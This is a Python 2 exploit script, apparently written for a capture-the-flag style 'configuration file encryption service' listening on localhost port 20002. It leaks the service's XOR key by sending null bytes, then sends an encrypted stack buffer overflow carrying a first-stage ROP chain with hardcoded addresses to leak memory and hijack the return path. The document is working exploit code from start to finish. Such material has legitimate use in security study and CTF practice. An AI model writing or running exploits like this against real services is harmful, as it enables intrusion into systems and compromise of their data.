#!/usr/bin/python
import socket
import struct
import time


# XOR Encryption
def crypt(value, key, key_sz=128):
	print "[+] Cipher Key Length  : ", len(key)
	print "[+] Cipher Data Length : ", len(value)
	return ''.join([chr(ord(value[x])^ord(key[x % key_sz])) for x in range(len(value))])


# Get banner 
def recv_banner(s, banner):
	return s.read(len(banner))

# send command
def send_cmd(s, cmd):
	s.write("E")
	s.write(struct.pack("I", len(cmd)))
	s.write(cmd)
	return

# Creating Socket Object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 20002))
sock = s.makefile('rw', bufsize=0) # file descriptor 

# Recv Welcome Banner
recv_banner(sock, "[-- Enterprise configuration file encryption service --]\n")

# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#                  Stage One Key Disclouser
# +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
# send NULL data
print "[+] Trying To Leak Encryption Key."
send_cmd(sock, "\x00"*128)
# Recv another banner
recv_banner(sock, "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")
# Recv Data 
keydata = recv_banner(sock, "A"*132)
print "[+] Extracting Cipher Key."
print "[+] Data Recv             : ", len(keydata)
print "[+] Key Length            : ", struct.unpack("I", keydata[:4])
key = keydata[4:]
if len(key)==128:
	print "[+] Key Disclouser stage Complete."
else:
	print "[+] key Disclouser Fail"
	exit(0)

# --------------------------------------------------------------
#                        Stage 2 Send Buffer
# -------------------------------------------------------------
#
# ROP Chain First Stage [Try To Disclouse lib Offset]
rop = ''
rop+= struct.pack("<I", 0x80495a0)  # nwrite(Arg1, Arg2, Arg3)
rop+= struct.pack("<I", 0xdeadbeef) # Next Pointer
rop+= struct.pack("<I", 1)          # arg1 = Stdout
rop+= struct.pack("<I", 0xbfd96c4c) # arg2 = buffer(Pointer To string)
rop+= struct.pack("<I", 3*4) # arg3 = Length

buff = 'YES'*4
buff+= 'A'*4096*32
buff+= 'EEEE'        # Base Pointer
buff+= rop        # Return Pointer
buff+= 'GGGG'
send_cmd(sock,crypt(buff, key))


# Banner Receive
recv_banner(sock, "[-- encryption complete. please mention 474bd3ad-c65b-47ab-b041-602047ab8792 to support staff to retrieve your file --]\n")

# Key Reply Recv
print "[+] Verifying Buffer Successfully Sent  : ", buff[:10]==recv_banner(sock, "A"*(len(buff)+4))[4:14]


#
print "[+] Trigger Victim Return Function Routine .", s.send("Q")
print "[+] Receive String :", s.recv(1024)#recv_banner(sock, "A"*5)

# Close SOcket
s.close()

